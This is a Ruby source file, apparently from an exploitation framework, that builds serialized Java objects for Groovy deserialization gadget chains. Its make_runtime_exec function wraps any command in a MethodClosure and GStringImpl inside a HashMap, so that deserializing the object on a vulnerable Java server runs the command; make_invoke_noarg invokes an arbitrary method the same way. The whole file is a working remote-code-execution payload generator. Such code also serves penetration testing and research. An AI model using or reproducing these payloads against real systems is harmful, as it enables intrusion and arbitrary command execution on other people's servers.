require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Groovy
        def make_invoke_noarg(obj, method)
          closure = Java::Serialize::JavaObject.new('Lorg/codehaus/groovy/runtime/MethodClosure;', 'owner' => obj,
                                                                                                   'method' => method,
                                                                                                   'maximumNumberOfParameters' => 0,
                                                                                                   'parameterTypes' => Java::Serialize::JavaArray.new('Ljava/lang/Class;', []))

          str = Java::Serialize::JavaObject.new('Lorg/codehaus/groovy/runtime/GStringImpl;', 'strings' => Java::Serialize::JavaArray.new('Ljava/lang/String;', ['a']),
                                                                                             'values' => Java::Serialize::JavaArray.new('Ljava/lang/Object;', [closure]))

          Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => { str => nil, str => nil })
        end
        module_function :make_invoke_noarg

        def make_runtime_exec(cmd)
          closure = Java::Serialize::JavaObject.new('Lorg/codehaus/groovy/runtime/MethodClosure;', 'owner' => cmd,
                                                                                                   'method' => 'execute',
                                                                                                   'maximumNumberOfParameters' => 0,
                                                                                                   'parameterTypes' => Java::Serialize::JavaArray.new('Ljava/lang/Class;', []))

          str = Java::Serialize::JavaObject.new('Lorg/codehaus/groovy/runtime/GStringImpl;', 'strings' => Java::Serialize::JavaArray.new('Ljava/lang/String;', ['a']),
                                                                                             'values' => Java::Serialize::JavaArray.new('Ljava/lang/Object;', [closure]))

          Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => { str => nil, str => nil })
        end
        module_function :make_runtime_exec
      end
    end
  end
end
